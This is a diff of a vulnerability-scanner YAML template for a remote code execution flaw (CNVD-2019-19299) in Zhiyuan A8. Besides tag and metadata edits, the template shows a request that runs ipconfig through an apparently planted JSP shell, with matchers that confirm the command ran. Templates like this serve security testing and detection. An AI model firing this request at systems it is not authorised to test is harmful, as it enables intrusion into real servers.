@@ -1,5 +1,4 @@
 id: CNVD-2019-19299
-
 info:
   name: Zhiyuan A8 - Remote Code Execution
   author: daffainfo
@@ -13,10 +12,8 @@ info:
     cvss-score: 10
     cwe-id: CWE-77
   metadata:
-    runzero-review: REJECT/2025-11-17/excluding tag intrusive
     max-request: 2
-  tags: cnvd2019,cnvd,zhiyuan,rce,intrusive,vuln
-
+  tags: cnvd,cnvd2019,intrusive,rce,vuln,zhiyuan
 http:
   - raw:
       - |
@@ -43,7 +40,6 @@ http:
       - |
         GET /seeyon/test123456.jsp?pwd=asasd3344&{{randstr}}=ipconfig HTTP/1.1
         Host: {{Hostname}}
-
     matchers:
       - type: dsl
         dsl:
@@ -51,4 +47,4 @@ http:
           - 'contains(body_1, "htmoffice operate")'
           - 'contains(body_2, "Windows IP")'
         condition: and
-
+        # digest: 4a0a004730450220122bc408c250aa2cd82f1d8e0e6d91a214b4ee76192af64f0bfc0bb9133b3039022100c0c90f184eedf4876b92e93eb7b3d140f85a60e1dbc6b05f713bbe316f53f849:922c64590222798bb761d5b6d8e72950
